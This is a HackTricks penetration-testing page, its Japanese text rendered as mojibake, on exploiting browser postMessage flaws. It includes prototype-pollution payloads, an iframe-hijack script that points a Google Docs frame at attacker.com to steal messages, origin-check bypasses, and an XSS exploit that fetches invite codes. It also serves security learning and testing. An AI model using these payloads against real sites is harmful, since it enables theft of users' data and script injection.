# PostMessageã®è„†å¼±æ€§

## PostMessageã®è„†å¼±æ€§

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã‹**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
- **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>

## **PostMessage**ã‚’é€ä¿¡ã™ã‚‹

**PostMessage**ã¯ã€æ¬¡ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ï¼š
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**targetOrigin** ã¯ '\*' ã¾ãŸã¯ _https://company.com_ ã®ã‚ˆã†ãª URL ã«ãªã‚Šã¾ã™ã€‚\
**ç¬¬äºŒã®ã‚·ãƒŠãƒªã‚ª**ã§ã¯ã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«ã®ã¿é€ä¿¡**ã•ã‚Œã¾ã™ï¼ˆãŸã¨ãˆã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ãŒç•°ãªã£ã¦ã„ã¦ã‚‚ï¼‰ã€‚\
**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ãŒä½¿ç”¨ã•ã‚Œã‚‹ã¨ã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é€ä¿¡**ã•ã‚Œã€ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚

### iframe ã¨ **targetOrigin** ã®ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã¸ã®æ”»æ’ƒ

[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**X-Frame-Header** ä¿è­·ãŒãªã„ãƒšãƒ¼ã‚¸ã‚’è¦‹ã¤ã‘ã€**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰** (\*) ã‚’ä½¿ç”¨ã—ã¦ **postMessage** ã‚’ä»‹ã—ã¦ **æ©Ÿå¯†æƒ…å ±ã‚’é€ä¿¡**ã—ã¦ã„ã‚‹ãƒšãƒ¼ã‚¸ãŒ **iframed** ã§ãã‚‹å ´åˆã€**iframe** ã® **origin** ã‚’ **å¤‰æ›´**ã—ã¦ã€**æ©Ÿå¯†** ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è‡ªåˆ†ãŒåˆ¶å¾¡ã™ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã« **æ¼æ´©** ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãƒšãƒ¼ã‚¸ãŒ iframed ã§ãã‚‹ãŒ **targetOrigin** ãŒ **URL ã«è¨­å®šã•ã‚Œã¦ã„ã¦ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã§ã¯ãªã„**å ´åˆã€ã“ã® **ãƒˆãƒªãƒƒã‚¯ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListenerã®æ‚ªç”¨

**`addEventListener`**ã¯ã€JSãŒ**`postMessages`ã‚’å—ä¿¡ã™ã‚‹é–¢æ•°ã‚’å®£è¨€ã™ã‚‹**ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°ã§ã™ã€‚\
æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### åˆ—æŒ™

ç¾åœ¨ã®ãƒšãƒ¼ã‚¸ã§**ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹**ã«ã¯ã€æ¬¡ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

- JSã‚³ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã—ã¦`window.addEventListener`ã¨`$(window).on`ï¼ˆ_JQueryãƒãƒ¼ã‚¸ãƒ§ãƒ³_ï¼‰ã‚’æ¤œç´¢ã—ã¾ã™
- é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã¾ã™ï¼š`getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

- ãƒ–ãƒ©ã‚¦ã‚¶ã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§_Elements --> Event Listeners_ã«ç§»å‹•ã—ã¾ã™

![](<../../.gitbook/assets/image (617).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)ã‚„[https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ã®ã‚ˆã†ãª**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½**ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½ã¯**ã™ã¹ã¦ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å‚å—**ã—ã¦è¡¨ç¤ºã—ã¾ã™ã€‚

### ã‚ªãƒªã‚¸ãƒ³ãƒã‚§ãƒƒã‚¯ã®ãƒã‚¤ãƒ‘ã‚¹

- **`event.isTrusted`**å±æ€§ã¯ã€æœ¬ç‰©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚ŒãŸã‚¤ãƒ™ãƒ³ãƒˆã«ã®ã¿`True`ã‚’è¿”ã™ãŸã‚ã€ã‚»ã‚­ãƒ¥ã‚¢ã¨è¦‹ãªã•ã‚Œã¾ã™ã€‚æ­£ã—ãå®Ÿè£…ã•ã‚Œã¦ã„ã‚Œã°ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã¯é›£ã—ã„ã§ã™ãŒã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ã§ã®é‡è¦æ€§ã¯é¡•è‘—ã§ã™ã€‚

- PostMessageã‚¤ãƒ™ãƒ³ãƒˆã§ã®ã‚ªãƒªã‚¸ãƒ³æ¤œè¨¼ã«**`indexOf()`**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã‚’ç¤ºã™ä¾‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`ã®**`search()`**ãƒ¡ã‚½ãƒƒãƒ‰ã¯æ­£è¦è¡¨ç¾ã‚’æƒ³å®šã—ã¦ãŠã‚Šã€æ–‡å­—åˆ—ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚æ­£è¦è¡¨ç¾ä»¥å¤–ã®ã‚‚ã®ã‚’æ¸¡ã™ã¨ã€æš—é»™ã®ã†ã¡ã«æ­£è¦è¡¨ç¾ã«å¤‰æ›ã•ã‚Œã€ãƒ¡ã‚½ãƒƒãƒ‰ãŒæ½œåœ¨çš„ã«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’ç”Ÿã˜ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ï¼š

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`**é–¢æ•°ã¯ã€`search()`ã¨åŒæ§˜ã«æ­£è¦è¡¨ç¾ã‚’å‡¦ç†ã—ã¾ã™ã€‚æ­£è¦è¡¨ç¾ãŒé©åˆ‡ã«æ§‹é€ åŒ–ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **`escapeHtml`**é–¢æ•°ã¯ã€æ–‡å­—ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ã¦å…¥åŠ›ã‚’ç„¡å®³åŒ–ã™ã‚‹ã“ã¨ã‚’æ„å›³ã—ã¦ã„ã¾ã™ã€‚ãŸã ã—ã€æ–°ã—ã„ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã›ãšã€æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ä¸Šæ›¸ãã—ã¾ã™ã€‚ã“ã®å‹•ä½œã¯æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹ã«ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ“ä½œã•ã‚Œã€ãã®åˆ¶å¾¡ã•ã‚ŒãŸãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒ`hasOwnProperty`ã‚’èªè­˜ã—ãªã„å ´åˆã€`escapeHtml`ã¯æœŸå¾…ã©ãŠã‚Šã«æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚ä»¥ä¸‹ã®ä¾‹ã§ç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š

- æœŸå¾…ã•ã‚Œã‚‹å¤±æ•—ï¼š
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã®ãƒã‚¤ãƒ‘ã‚¹ï¼š
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

ã“ã®è„†å¼±æ€§ã®æ–‡è„ˆã§ã¯ã€`File`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€èª­ã¿å–ã‚Šå°‚ç”¨ã®`name`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã¤ãŸã‚ã€`escapeHtml`é–¢æ•°ã«ã‚ˆã£ã¦ç„¡å®³åŒ–ã•ã‚Œãªã„ã“ã¨ãŒç‰¹ã«æ‚ªç”¨ã•ã‚Œã‚„ã™ã„ã§ã™ã€‚ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã•ã‚Œã‚‹ã¨ãã«`escapeHtml`é–¢æ•°ã«ã‚ˆã£ã¦ç„¡å®³åŒ–ã•ã‚Œãšã€æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- JavaScriptã®`document.domain`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’çŸ­ç¸®ã™ã‚‹ãŸã‚ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«ã‚ˆã£ã¦è¨­å®šã§ãã€åŒã˜è¦ªãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã§ã‚ˆã‚Šç·©å’Œã•ã‚ŒãŸåŒä¸€ã‚ªãƒªã‚¸ãƒ³ãƒãƒªã‚·ãƒ¼ã®é©ç”¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

### e.origin == window.origin ãƒã‚¤ãƒ‘ã‚¹

%%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%ã®ã‚ˆã†ã«**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸiframe**ã«Webãƒšãƒ¼ã‚¸ã‚’åŸ‹ã‚è¾¼ã‚€å ´åˆã€iframeã®ã‚ªãƒªã‚¸ãƒ³ã¯`null`ã«è¨­å®šã•ã‚Œã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã“ã‚Œã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å±æ€§**ã¨ãã‚Œã‚‰ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨æ©Ÿèƒ½ã«ä¸ãˆã‚‹å½±éŸ¿ã«é–¢é€£ã—ã¦ç‰¹ã«é‡è¦ã§ã™ã€‚

ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å±æ€§ã«**`allow-popups`**ã‚’æŒ‡å®šã™ã‚‹ã¨ã€iframeå†…ã‹ã‚‰é–‹ã‹ã‚ŒãŸãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¯è¦ªã®ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ¶é™ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€**`allow-popups-to-escape-sandbox`**å±æ€§ãŒå«ã¾ã‚Œã¦ã„ãªã„é™ã‚Šã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®ã‚ªãƒªã‚¸ãƒ³ã‚‚åŒæ§˜ã«`null`ã«è¨­å®šã•ã‚Œã€iframeã®ã‚ªãƒªã‚¸ãƒ³ã¨ä¸€è‡´ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®æ¡ä»¶ä¸‹ã§ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãŒé–‹ã‹ã‚Œã€iframeã‹ã‚‰ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã«**`postMessage`**ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€é€ä¿¡å…ƒã¨å—ä¿¡å…ˆã®ä¸¡æ–¹ã®ã‚ªãƒªã‚¸ãƒ³ãŒ`null`ã«è¨­å®šã•ã‚Œã¾ã™ã€‚ã“ã®çŠ¶æ³ã§ã¯ã€**`e.origin == window.origin`**ãŒtrueï¼ˆ`null == null`ï¼‰ã«è©•ä¾¡ã•ã‚Œã‚‹ãŸã‚ã€iframeã¨ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã¯ä¸¡æ–¹ãŒ`null`ã®åŒã˜ã‚ªãƒªã‚¸ãƒ³å€¤ã‚’å…±æœ‰ã—ã¦ã„ã‚‹ãŸã‚ã§ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’**èª­ã‚“ã§ãã ã•ã„**ï¼š

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceã®ãƒã‚¤ãƒ‘ã‚¹

ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹åŒã˜ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆç‰¹ã«**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½ã®Content Scripts**ã«ã¨ã£ã¦èˆˆå‘³æ·±ã„ï¼‰ã€‚
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`**ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**null**ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**iframe**ã‚’ä½œæˆã—ã€**postMessage**ã‚’**é€ä¿¡**ã—ã¦**ã™ãã«å‰Šé™¤**ã™ã‚‹ã“ã¨ã§ã€‚

è©³ç´°ã¯**ã“ã¡ã‚‰ã‚’å‚ç…§**:

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Headerãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€ç†æƒ³çš„ã«ã¯**è¢«å®³è€…ã®Webãƒšãƒ¼ã‚¸**ã‚’`iframe`å†…ã«é…ç½®ã§ãã‚‹ã¨è‰¯ã„ã§ã—ã‚‡ã†ã€‚ã—ã‹ã—ã€`X-Frame-Header`ã®ã‚ˆã†ãªãƒ˜ãƒƒãƒ€ãƒ¼ã¯ãã®**å‹•ä½œã‚’é˜²ã**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãã®ã‚ˆã†ãªã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã‚ˆã‚Šæ´—ç·´ã•ã‚ŒãŸæ”»æ’ƒã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è„†å¼±ãªWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æ–°ã—ã„ã‚¿ãƒ–ã‚’é–‹ã„ã¦é€šä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ãƒ¡ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦å­ã«é€ä¿¡ã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç›—ã‚€

æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**ãƒ¡ã‚¤ãƒ³**ãƒšãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹å‰ã«**ãƒ–ãƒ­ãƒƒã‚¯**ã—ã¦**å­ã®iframe**ã«é€ä¿¡ã•ã‚ŒãŸ**æ©Ÿå¯†postmessageãƒ‡ãƒ¼ã‚¿**ã‚’ç›—ã‚€æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ãã—ã¦ã€**å­ã®XSSã‚’æ‚ªç”¨**ã—ã¦ãƒ‡ãƒ¼ã‚¿ãŒå—ä¿¡ã•ã‚Œã‚‹å‰ã«ãƒ‡ãƒ¼ã‚¿ã‚’**æ¼æ´©**ã•ã›ã¾ã™ï¼š

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeã®å ´æ‰€ã‚’å¤‰æ›´ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç›—ã‚€

ã‚‚ã—X-Frame-Headerã‚’æŒãŸãªã„ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã«åˆ¥ã®iframeã‚’å«ã‚ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãã®å­iframeã®å ´æ‰€ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚ãã®ãŸã‚ã€**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã•ã‚ŒãŸ**postmessage**ã‚’å—ä¿¡ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®iframeã®**origin**ã‚’è‡ªåˆ†ãŒ**åˆ¶å¾¡**ã™ã‚‹ãƒšãƒ¼ã‚¸ã«**å¤‰æ›´**ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageã‹ã‚‰Prototype PollutionãŠã‚ˆã³/ã¾ãŸã¯XSSã¸

`postMessage`ã‚’ä»‹ã—ã¦é€ä¿¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ãŒJSã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€**ãƒšãƒ¼ã‚¸**ã«**iframe**ã‚’æŒ¿å…¥ã—ã€**prototype pollution/XSS**ã‚’æ‚ªç”¨ã—ã¦ã€`postMessage`ã‚’ä»‹ã—ã¦ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’é€ä¿¡ã§ãã¾ã™ã€‚

`postMessage`ã‚’ä»‹ã—ã¦**éå¸¸ã«ã‚ˆãèª¬æ˜ã•ã‚ŒãŸXSS**ã®ä¾‹ã¯ã€[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Prototype Pollutionã‚’æ‚ªç”¨ã—ã¦ã‹ã‚‰XSS**ã‚’è¡Œã†ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚ã“ã‚Œã¯`iframe`ã«`postMessage`ã‚’ä»‹ã—ã¦é€ä¿¡ã•ã‚Œã¾ã™ï¼š
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**ã•ã‚‰ã«æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹ã«ã¯**ï¼š

* [**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“**](../deserialization/nodejs-proto-prototype-pollution/)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯
* [**XSS**](../xss-cross-site-scripting/)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯
* [**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‹ã‚‰XSSã¸**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯

## å‚è€ƒæ–‡çŒ®

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* ç·´ç¿’ç”¨: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
